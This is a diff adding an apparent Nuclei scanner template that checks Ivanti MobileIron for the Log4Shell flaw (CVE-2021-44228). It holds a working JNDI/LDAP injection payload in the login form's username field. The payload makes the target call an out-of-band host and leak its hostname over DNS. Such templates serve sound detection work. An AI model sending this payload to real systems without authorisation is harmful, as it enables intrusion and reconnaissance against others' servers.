@@ -1,0 +1,74 @@
+id: mobileiron-log4j-rce
+
+info:
+  name: Ivanti MobileIron (Log4j) - Remote Code Execution
+  author: meme-lord
+  severity: critical
+  description: Ivanti MobileIron is susceptible to remote code execution via the Apache Log4j2 library.  Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI-related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  remediation: From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.
+  reference:
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://www.zdnet.com/article/mobileiron-customers-urged-to-patch-systems-due-to-potential-log4j-exploitation/
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-917
+    cpe: cpe:2.3:a:ivanti:mobileiron:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.html:"MobileIron"
+    product: mobileiron
+    vendor: ivanti
+  tags: jndi,log4j,rce,cve,cve2021,ivanti,oast,mobileiron,kev,vuln
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        POST /mifs/j_spring_security_check HTTP/1.1
+        Referer: {{RootURL}}/mifs/user/login.jsp
+        Content-Type: application/x-www-form-urlencoded
+
+        j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=password&logincontext=employee
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: location
+        words:
+          - '/mifs/user/login.jsp?error=1'
+
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+# digest: 490a0046304402204f8715536d71f0a1afc80a2cf37eb9552029b311bc14d4e4a121e1d76750f58902202b43dbda60697476f21070a97476c59ea655e395c7a4b19fdc162e20dca2ff65:922c64590222798bb761d5b6d8e72950
